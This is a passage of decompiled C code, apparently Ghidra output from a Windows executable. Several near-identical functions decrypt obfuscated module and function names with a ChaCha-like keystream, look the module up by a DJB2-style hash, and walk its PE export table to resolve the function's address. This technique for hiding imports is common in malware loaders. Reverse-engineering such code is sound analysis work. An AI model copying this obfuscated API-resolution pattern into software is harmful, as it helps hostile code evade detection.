    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar7 + uVar6;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar16 + uVar15;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    local_f8[uVar11 + 0x40] =
         (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar7 ^ uVar6 ^ uVar15) >>
               (((byte)uVar11 & 3) << 3)) ^ *(byte *)(uVar11 + param_2);
    uVar11 = uVar11 + 1;
  } while (uVar11 < 0xe);
  lVar10 = 0;
  uVar12 = 0x1505;
  bVar2 = local_f8[0];
  for (uVar11 = 0; (bVar2 != 0 && (uVar11 < 0x3f)); uVar11 = uVar11 + 1) {
    uVar12 = (local_f8[uVar11] | 0x20) ^ uVar12 * 0x21;
    bVar2 = local_f8[uVar11 + 1];
  }
  psVar3 = (short *)FUN_140001950(uVar12);
  if (((psVar3 != (short *)0x0) && (*psVar3 == 0x5a4d)) &&
     (uVar12 = *(uint *)((longlong)*(int *)(psVar3 + 0x1e) + 0x88 + (longlong)psVar3),
     uVar11 = (ulonglong)uVar12, uVar12 != 0)) {
    uVar12 = *(uint *)((longlong)psVar3 + uVar11 + 0x18);
    uVar14 = 0;
    if (uVar12 != 0) {
      do {
        pbVar8 = local_f8 + 0x40;
        pbVar4 = (byte *)((ulonglong)
                          *(uint *)((longlong)psVar3 +
                                   uVar14 * 4 +
                                   (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x20)) +
                         (longlong)psVar3);
        bVar2 = *pbVar4;
        while ((bVar2 != 0 && (bVar2 == *pbVar8))) {
          pbVar1 = pbVar4 + 1;
          pbVar4 = pbVar4 + 1;
          pbVar8 = pbVar8 + 1;
          bVar2 = *pbVar1;
        }
        if (*pbVar4 == *pbVar8) {
          lVar10 = (ulonglong)
                   *(uint *)((longlong)psVar3 +
                            (ulonglong)
                            *(ushort *)
                             ((longlong)psVar3 +
                             uVar14 * 2 + (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x24)) *
                            4 + (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x1c)) +
                   (longlong)psVar3;
          goto LAB_140009056;
        }
        uVar13 = (int)uVar14 + 1;
        uVar14 = (ulonglong)uVar13;
      } while (uVar13 < uVar12);
    }
    lVar10 = 0;
  }
LAB_140009056:
  lVar5 = 0;
  do {
    local_f8[lVar5] = 0;
    lVar5 = lVar5 + 1;
  } while (lVar5 != 0x40);
  lVar5 = 0;
  do {
    local_f8[lVar5 + 0x40] = 0;
    lVar5 = lVar5 + 1;
  } while (lVar5 != 0x80);
  return lVar10;
}


// ==== FUN_1400090c0 @ 1400090c0 size 955

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

longlong FUN_1400090c0(longlong param_1,longlong param_2)

{
  byte *pbVar1;
  byte bVar2;
  short *psVar3;
  byte *pbVar4;
  longlong lVar5;
  uint uVar6;
  uint uVar7;
  byte *pbVar8;
  uint uVar9;
  longlong lVar10;
  ulonglong uVar11;
  uint uVar12;
  uint uVar13;
  ulonglong uVar14;
  uint uVar15;
  uint uVar16;
  undefined1 auStack_118 [32];
  byte local_f8 [192];
  ulonglong local_38;
  
  local_38 = DAT_140010000 ^ (ulonglong)auStack_118;
  uVar13 = *(uint *)(param_1 + 0xc);
  uVar11 = 0;
  local_f8[0] = 0;
  local_f8[1] = 0;
  local_f8[2] = 0;
  local_f8[3] = 0;
  local_f8[4] = 0;
  local_f8[5] = 0;
  local_f8[6] = 0;
  local_f8[7] = 0;
  local_f8[8] = 0;
  local_f8[9] = 0;
  local_f8[10] = 0;
  local_f8[0xb] = 0;
  local_f8[0xc] = 0;
  local_f8[0xd] = 0;
  local_f8[0xe] = 0;
  local_f8[0xf] = 0;
  uVar9 = (uVar13 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
  local_f8[0x10] = 0;
  local_f8[0x11] = 0;
  local_f8[0x12] = 0;
  local_f8[0x13] = 0;
  local_f8[0x14] = 0;
  local_f8[0x15] = 0;
  local_f8[0x16] = 0;
  local_f8[0x17] = 0;
  local_f8[0x18] = 0;
  local_f8[0x19] = 0;
  local_f8[0x1a] = 0;
  local_f8[0x1b] = 0;
  local_f8[0x1c] = 0;
  local_f8[0x1d] = 0;
  local_f8[0x1e] = 0;
  local_f8[0x1f] = 0;
  local_f8[0x20] = 0;
  local_f8[0x21] = 0;
  local_f8[0x22] = 0;
  local_f8[0x23] = 0;
  local_f8[0x24] = 0;
  local_f8[0x25] = 0;
  local_f8[0x26] = 0;
  local_f8[0x27] = 0;
  local_f8[0x28] = 0;
  local_f8[0x29] = 0;
  local_f8[0x2a] = 0;
  local_f8[0x2b] = 0;
  local_f8[0x2c] = 0;
  local_f8[0x2d] = 0;
  local_f8[0x2e] = 0;
  local_f8[0x2f] = 0;
  uVar12 = (uVar13 ^ 0x64d7cf8) + uVar9;
  local_f8[0x30] = 0;
  local_f8[0x31] = 0;
  local_f8[0x32] = 0;
  local_f8[0x33] = 0;
  local_f8[0x34] = 0;
  local_f8[0x35] = 0;
  local_f8[0x36] = 0;
  local_f8[0x37] = 0;
  local_f8[0x38] = 0;
  local_f8[0x39] = 0;
  local_f8[0x3a] = 0;
  local_f8[0x3b] = 0;
  local_f8[0x3c] = 0;
  local_f8[0x3d] = 0;
  local_f8[0x3e] = 0;
  local_f8[0x3f] = 0;
  do {
    uVar6 = (uint)uVar11 ^ uVar12 ^ 0x99f0b3d4;
    uVar7 = uVar6 << 0x10 | uVar6 >> 0x10;
    uVar6 = uVar7 + ((uVar13 >> 0x13 | uVar13 << 0xd) ^ 0x13371337);
    uVar15 = uVar6 ^ uVar9;
    uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
    uVar15 = uVar16 + uVar12;
    uVar7 = uVar15 ^ uVar7;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar7 + uVar6;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar16 + uVar15;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    local_f8[uVar11] =
         (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar7 ^ uVar6 ^ uVar15) >>
               (((byte)uVar11 & 3) << 3)) ^ *(byte *)(param_1 + uVar11);
    uVar11 = uVar11 + 1;
  } while (uVar11 < 10);
  uVar13 = *(uint *)(param_2 + 0xc);
  uVar11 = 0;
  local_f8[0x40] = 0;
  local_f8[0x41] = 0;
  local_f8[0x42] = 0;
  local_f8[0x43] = 0;
  local_f8[0x44] = 0;
  local_f8[0x45] = 0;
  local_f8[0x46] = 0;
  local_f8[0x47] = 0;
  local_f8[0x48] = 0;
  local_f8[0x49] = 0;
  local_f8[0x4a] = 0;
  local_f8[0x4b] = 0;
  local_f8[0x4c] = 0;
  local_f8[0x4d] = 0;
  local_f8[0x4e] = 0;
  local_f8[0x4f] = 0;
  local_f8[0x50] = 0;
  local_f8[0x51] = 0;
  local_f8[0x52] = 0;
  local_f8[0x53] = 0;
  local_f8[0x54] = 0;
  local_f8[0x55] = 0;
  local_f8[0x56] = 0;
  local_f8[0x57] = 0;
  local_f8[0x58] = 0;
  local_f8[0x59] = 0;
  local_f8[0x5a] = 0;
  local_f8[0x5b] = 0;
  local_f8[0x5c] = 0;
  local_f8[0x5d] = 0;
  local_f8[0x5e] = 0;
  local_f8[0x5f] = 0;
  uVar9 = (uVar13 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
  local_f8[0x60] = 0;
  local_f8[0x61] = 0;
  local_f8[0x62] = 0;
  local_f8[99] = 0;
  local_f8[100] = 0;
  local_f8[0x65] = 0;
  local_f8[0x66] = 0;
  local_f8[0x67] = 0;
  local_f8[0x68] = 0;
  local_f8[0x69] = 0;
  local_f8[0x6a] = 0;
  local_f8[0x6b] = 0;
  local_f8[0x6c] = 0;
  local_f8[0x6d] = 0;
  local_f8[0x6e] = 0;
  local_f8[0x6f] = 0;
  local_f8[0x70] = 0;
  local_f8[0x71] = 0;
  local_f8[0x72] = 0;
  local_f8[0x73] = 0;
  local_f8[0x74] = 0;
  local_f8[0x75] = 0;
  local_f8[0x76] = 0;
  local_f8[0x77] = 0;
  local_f8[0x78] = 0;
  local_f8[0x79] = 0;
  local_f8[0x7a] = 0;
  local_f8[0x7b] = 0;
  local_f8[0x7c] = 0;
  local_f8[0x7d] = 0;
  local_f8[0x7e] = 0;
  local_f8[0x7f] = 0;
  uVar12 = (uVar13 ^ 0x64d7cf8) + uVar9;
  local_f8[0x80] = 0;
  local_f8[0x81] = 0;
  local_f8[0x82] = 0;
  local_f8[0x83] = 0;
  local_f8[0x84] = 0;
  local_f8[0x85] = 0;
  local_f8[0x86] = 0;
  local_f8[0x87] = 0;
  local_f8[0x88] = 0;
  local_f8[0x89] = 0;
  local_f8[0x8a] = 0;
  local_f8[0x8b] = 0;
  local_f8[0x8c] = 0;
  local_f8[0x8d] = 0;
  local_f8[0x8e] = 0;
  local_f8[0x8f] = 0;
  local_f8[0x90] = 0;
  local_f8[0x91] = 0;
  local_f8[0x92] = 0;
  local_f8[0x93] = 0;
  local_f8[0x94] = 0;
  local_f8[0x95] = 0;
  local_f8[0x96] = 0;
  local_f8[0x97] = 0;
  local_f8[0x98] = 0;
  local_f8[0x99] = 0;
  local_f8[0x9a] = 0;
  local_f8[0x9b] = 0;
  local_f8[0x9c] = 0;
  local_f8[0x9d] = 0;
  local_f8[0x9e] = 0;
  local_f8[0x9f] = 0;
  local_f8[0xa0] = 0;
  local_f8[0xa1] = 0;
  local_f8[0xa2] = 0;
  local_f8[0xa3] = 0;
  local_f8[0xa4] = 0;
  local_f8[0xa5] = 0;
  local_f8[0xa6] = 0;
  local_f8[0xa7] = 0;
  local_f8[0xa8] = 0;
  local_f8[0xa9] = 0;
  local_f8[0xaa] = 0;
  local_f8[0xab] = 0;
  local_f8[0xac] = 0;
  local_f8[0xad] = 0;
  local_f8[0xae] = 0;
  local_f8[0xaf] = 0;
  local_f8[0xb0] = 0;
  local_f8[0xb1] = 0;
  local_f8[0xb2] = 0;
  local_f8[0xb3] = 0;
  local_f8[0xb4] = 0;
  local_f8[0xb5] = 0;
  local_f8[0xb6] = 0;
  local_f8[0xb7] = 0;
  local_f8[0xb8] = 0;
  local_f8[0xb9] = 0;
  local_f8[0xba] = 0;
  local_f8[0xbb] = 0;
  local_f8[0xbc] = 0;
  local_f8[0xbd] = 0;
  local_f8[0xbe] = 0;
  local_f8[0xbf] = 0;
  do {
    uVar6 = (uint)uVar11 ^ uVar12 ^ 0x99f0b3d4;
    uVar7 = uVar6 << 0x10 | uVar6 >> 0x10;
    uVar6 = uVar7 + ((uVar13 >> 0x13 | uVar13 << 0xd) ^ 0x13371337);
    uVar15 = uVar6 ^ uVar9;
    uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
    uVar15 = uVar16 + uVar12;
    uVar7 = uVar15 ^ uVar7;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar7 + uVar6;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar16 + uVar15;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    local_f8[uVar11 + 0x40] =
         (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar7 ^ uVar6 ^ uVar15) >>
               (((byte)uVar11 & 3) << 3)) ^ *(byte *)(uVar11 + param_2);
    uVar11 = uVar11 + 1;
  } while (uVar11 < 0xc);
  lVar10 = 0;
  uVar12 = 0x1505;
  bVar2 = local_f8[0];
  for (uVar11 = 0; (bVar2 != 0 && (uVar11 < 0x3f)); uVar11 = uVar11 + 1) {
    uVar12 = (local_f8[uVar11] | 0x20) ^ uVar12 * 0x21;
    bVar2 = local_f8[uVar11 + 1];
  }
  psVar3 = (short *)FUN_140001950(uVar12);
  if (((psVar3 != (short *)0x0) && (*psVar3 == 0x5a4d)) &&
     (uVar12 = *(uint *)((longlong)*(int *)(psVar3 + 0x1e) + 0x88 + (longlong)psVar3),
     uVar11 = (ulonglong)uVar12, uVar12 != 0)) {
    uVar12 = *(uint *)((longlong)psVar3 + uVar11 + 0x18);
    uVar14 = 0;
    if (uVar12 != 0) {
      do {
        pbVar8 = local_f8 + 0x40;
        pbVar4 = (byte *)((ulonglong)
                          *(uint *)((longlong)psVar3 +
                                   uVar14 * 4 +
                                   (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x20)) +
                         (longlong)psVar3);
        bVar2 = *pbVar4;
        while ((bVar2 != 0 && (bVar2 == *pbVar8))) {
          pbVar1 = pbVar4 + 1;
          pbVar4 = pbVar4 + 1;
          pbVar8 = pbVar8 + 1;
          bVar2 = *pbVar1;
        }
        if (*pbVar4 == *pbVar8) {
          lVar10 = (ulonglong)
                   *(uint *)((longlong)psVar3 +
                            (ulonglong)
                            *(ushort *)
                             ((longlong)psVar3 +
                             uVar14 * 2 + (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x24)) *
                            4 + (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x1c)) +
                   (longlong)psVar3;
          goto LAB_140009416;
        }
        uVar13 = (int)uVar14 + 1;
        uVar14 = (ulonglong)uVar13;
      } while (uVar13 < uVar12);
    }
    lVar10 = 0;
  }
LAB_140009416:
  lVar5 = 0;
  do {
    local_f8[lVar5] = 0;
    lVar5 = lVar5 + 1;
  } while (lVar5 != 0x40);
  lVar5 = 0;
  do {
    local_f8[lVar5 + 0x40] = 0;
    lVar5 = lVar5 + 1;
  } while (lVar5 != 0x80);
  return lVar10;
}


// ==== FUN_140009480 @ 140009480 size 955

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

longlong FUN_140009480(longlong param_1,longlong param_2)

{
  byte *pbVar1;
  byte bVar2;
  short *psVar3;
  byte *pbVar4;
  longlong lVar5;
  uint uVar6;
  uint uVar7;
  byte *pbVar8;
  uint uVar9;
  longlong lVar10;
  ulonglong uVar11;
  uint uVar12;
  uint uVar13;
  ulonglong uVar14;
  uint uVar15;
  uint uVar16;
  undefined1 auStack_118 [32];
  byte local_f8 [192];
  ulonglong local_38;
  
  local_38 = DAT_140010000 ^ (ulonglong)auStack_118;
  uVar13 = *(uint *)(param_1 + 0x10);
  uVar11 = 0;
  local_f8[0] = 0;
  local_f8[1] = 0;
  local_f8[2] = 0;
  local_f8[3] = 0;
  local_f8[4] = 0;
  local_f8[5] = 0;
  local_f8[6] = 0;
  local_f8[7] = 0;
  local_f8[8] = 0;
  local_f8[9] = 0;
  local_f8[10] = 0;
  local_f8[0xb] = 0;
  local_f8[0xc] = 0;
  local_f8[0xd] = 0;
  local_f8[0xe] = 0;
  local_f8[0xf] = 0;
  uVar9 = (uVar13 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
  local_f8[0x10] = 0;
  local_f8[0x11] = 0;
  local_f8[0x12] = 0;
  local_f8[0x13] = 0;
  local_f8[0x14] = 0;
  local_f8[0x15] = 0;
  local_f8[0x16] = 0;
  local_f8[0x17] = 0;
  local_f8[0x18] = 0;
  local_f8[0x19] = 0;
  local_f8[0x1a] = 0;
  local_f8[0x1b] = 0;
  local_f8[0x1c] = 0;
  local_f8[0x1d] = 0;
  local_f8[0x1e] = 0;
  local_f8[0x1f] = 0;
  local_f8[0x20] = 0;
  local_f8[0x21] = 0;
  local_f8[0x22] = 0;
  local_f8[0x23] = 0;
  local_f8[0x24] = 0;
  local_f8[0x25] = 0;
  local_f8[0x26] = 0;
  local_f8[0x27] = 0;
  local_f8[0x28] = 0;
  local_f8[0x29] = 0;
  local_f8[0x2a] = 0;
  local_f8[0x2b] = 0;
  local_f8[0x2c] = 0;
  local_f8[0x2d] = 0;
  local_f8[0x2e] = 0;
  local_f8[0x2f] = 0;
  uVar12 = (uVar13 ^ 0x64d7cf8) + uVar9;
  local_f8[0x30] = 0;
  local_f8[0x31] = 0;
  local_f8[0x32] = 0;
  local_f8[0x33] = 0;
  local_f8[0x34] = 0;
  local_f8[0x35] = 0;
  local_f8[0x36] = 0;
  local_f8[0x37] = 0;
  local_f8[0x38] = 0;
  local_f8[0x39] = 0;
  local_f8[0x3a] = 0;
  local_f8[0x3b] = 0;
  local_f8[0x3c] = 0;
  local_f8[0x3d] = 0;
  local_f8[0x3e] = 0;
  local_f8[0x3f] = 0;
  do {
    uVar6 = (uint)uVar11 ^ uVar12 ^ 0x99f0b3d4;
    uVar7 = uVar6 << 0x10 | uVar6 >> 0x10;
    uVar6 = uVar7 + ((uVar13 >> 0x13 | uVar13 << 0xd) ^ 0x13371337);
    uVar15 = uVar6 ^ uVar9;
    uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
    uVar15 = uVar16 + uVar12;
    uVar7 = uVar15 ^ uVar7;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar7 + uVar6;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar16 + uVar15;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    local_f8[uVar11] =
         (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar7 ^ uVar6 ^ uVar15) >>
               (((byte)uVar11 & 3) << 3)) ^ *(byte *)(param_1 + uVar11);
    uVar11 = uVar11 + 1;
  } while (uVar11 < 0xd);
  uVar13 = *(uint *)(param_2 + 0x10);
  uVar11 = 0;
  local_f8[0x40] = 0;
  local_f8[0x41] = 0;
  local_f8[0x42] = 0;
  local_f8[0x43] = 0;
  local_f8[0x44] = 0;
  local_f8[0x45] = 0;
  local_f8[0x46] = 0;
  local_f8[0x47] = 0;
  local_f8[0x48] = 0;
  local_f8[0x49] = 0;
  local_f8[0x4a] = 0;
  local_f8[0x4b] = 0;
  local_f8[0x4c] = 0;
  local_f8[0x4d] = 0;
  local_f8[0x4e] = 0;
  local_f8[0x4f] = 0;
  local_f8[0x50] = 0;
  local_f8[0x51] = 0;
  local_f8[0x52] = 0;
  local_f8[0x53] = 0;
  local_f8[0x54] = 0;
  local_f8[0x55] = 0;
  local_f8[0x56] = 0;
  local_f8[0x57] = 0;
  local_f8[0x58] = 0;
  local_f8[0x59] = 0;
  local_f8[0x5a] = 0;
  local_f8[0x5b] = 0;
  local_f8[0x5c] = 0;
  local_f8[0x5d] = 0;
  local_f8[0x5e] = 0;
  local_f8[0x5f] = 0;
  uVar9 = (uVar13 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
  local_f8[0x60] = 0;
  local_f8[0x61] = 0;
  local_f8[0x62] = 0;
  local_f8[99] = 0;
  local_f8[100] = 0;
  local_f8[0x65] = 0;
  local_f8[0x66] = 0;
  local_f8[0x67] = 0;
  local_f8[0x68] = 0;
  local_f8[0x69] = 0;
  local_f8[0x6a] = 0;
  local_f8[0x6b] = 0;
  local_f8[0x6c] = 0;
  local_f8[0x6d] = 0;
  local_f8[0x6e] = 0;
  local_f8[0x6f] = 0;
  local_f8[0x70] = 0;
  local_f8[0x71] = 0;
  local_f8[0x72] = 0;
  local_f8[0x73] = 0;
  local_f8[0x74] = 0;
  local_f8[0x75] = 0;
  local_f8[0x76] = 0;
  local_f8[0x77] = 0;
  local_f8[0x78] = 0;
  local_f8[0x79] = 0;
  local_f8[0x7a] = 0;
  local_f8[0x7b] = 0;
  local_f8[0x7c] = 0;
  local_f8[0x7d] = 0;
  local_f8[0x7e] = 0;
  local_f8[0x7f] = 0;
  uVar12 = (uVar13 ^ 0x64d7cf8) + uVar9;
  local_f8[0x80] = 0;
  local_f8[0x81] = 0;
  local_f8[0x82] = 0;
  local_f8[0x83] = 0;
  local_f8[0x84] = 0;
  local_f8[0x85] = 0;
  local_f8[0x86] = 0;
  local_f8[0x87] = 0;
  local_f8[0x88] = 0;
  local_f8[0x89] = 0;
  local_f8[0x8a] = 0;
  local_f8[0x8b] = 0;
  local_f8[0x8c] = 0;
  local_f8[0x8d] = 0;
  local_f8[0x8e] = 0;
  local_f8[0x8f] = 0;
  local_f8[0x90] = 0;
  local_f8[0x91] = 0;
  local_f8[0x92] = 0;
  local_f8[0x93] = 0;
  local_f8[0x94] = 0;
  local_f8[0x95] = 0;
  local_f8[0x96] = 0;
  local_f8[0x97] = 0;
  local_f8[0x98] = 0;
  local_f8[0x99] = 0;
  local_f8[0x9a] = 0;
  local_f8[0x9b] = 0;
  local_f8[0x9c] = 0;
  local_f8[0x9d] = 0;
  local_f8[0x9e] = 0;
  local_f8[0x9f] = 0;
  local_f8[0xa0] = 0;
  local_f8[0xa1] = 0;
  local_f8[0xa2] = 0;
  local_f8[0xa3] = 0;
  local_f8[0xa4] = 0;
  local_f8[0xa5] = 0;
  local_f8[0xa6] = 0;
  local_f8[0xa7] = 0;
  local_f8[0xa8] = 0;
  local_f8[0xa9] = 0;
  local_f8[0xaa] = 0;
  local_f8[0xab] = 0;
  local_f8[0xac] = 0;
  local_f8[0xad] = 0;
  local_f8[0xae] = 0;
  local_f8[0xaf] = 0;
  local_f8[0xb0] = 0;
  local_f8[0xb1] = 0;
  local_f8[0xb2] = 0;
  local_f8[0xb3] = 0;
  local_f8[0xb4] = 0;
  local_f8[0xb5] = 0;
  local_f8[0xb6] = 0;
  local_f8[0xb7] = 0;
  local_f8[0xb8] = 0;
  local_f8[0xb9] = 0;
  local_f8[0xba] = 0;
  local_f8[0xbb] = 0;
  local_f8[0xbc] = 0;
  local_f8[0xbd] = 0;
  local_f8[0xbe] = 0;
  local_f8[0xbf] = 0;
  do {
    uVar6 = (uint)uVar11 ^ uVar12 ^ 0x99f0b3d4;
    uVar7 = uVar6 << 0x10 | uVar6 >> 0x10;
    uVar6 = uVar7 + ((uVar13 >> 0x13 | uVar13 << 0xd) ^ 0x13371337);
    uVar15 = uVar6 ^ uVar9;
    uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
    uVar15 = uVar16 + uVar12;
    uVar7 = uVar15 ^ uVar7;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar7 + uVar6;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar16 + uVar15;
    uVar7 = uVar7 ^ uVar15;
